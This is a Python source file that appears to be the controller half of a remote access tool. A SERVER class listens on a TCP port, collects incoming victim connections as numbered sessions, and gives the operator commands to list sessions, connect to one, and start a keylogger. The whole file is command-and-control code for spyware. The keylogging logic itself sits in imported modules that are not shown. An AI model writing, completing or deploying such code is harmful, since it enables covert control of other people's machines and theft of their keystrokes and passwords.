from common.output import *
from communication import COMMCENTER
from client import CLIENT
import socket
import threading

class SERVER(COMMCENTER):
    SOCKET = None
    RUNNER = True

    def __init__(self, prs):
        self.address = prs.address
        self.port = prs.port

    def bind(self):
        self.SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.SOCKET.bind((self.address, self.port))
            print_green("Successfuly Bind to %s%s:%i" % (
                RED,
                self.address,
                self.port,
            ))
        except Exception as e:
            print_red("Unable to bind to %s%s:%i" % (
                RED,
                self.address,
                self.port,
            ))

    def accept_threads(self):
        self.SOCKET.listen(10)

        while self.RUNNER:
            conn, addr = self.SOCKET.accept()
            is_valid = True

            self.COUNTER += 1
            client = CLIENT(conn, addr)
            client.engage()

            self.CLIENTS.append(
                (
                    self.COUNTER,
                    client
                )
            )

    def accept(self):
        t = threading.Thread(target=self.accept_threads)
        t.daemon = True
        t.start()

    def execute(self, vals):
        if vals:
            if vals[0] == "exit":
                self.c_exit()
            elif vals[0] == "help":
                self.c_help(vals)
            elif vals[0] == "sessions":
                self.c_sessions()
            elif vals[0] == "connect":
                self.c_connect(vals)
            elif vals[0] == "disconnect":
                self.c_disconnect()
            elif vals[0] == "keylogger":
                self.c_keylogger(vals)

    def launch(self):
        print_green("Type 'help' to see commands")

        while True:
            val = get_com(self.CURRENT)
            self.execute(val.split(" "))

    def close(self):
        self.SOCKET.close()

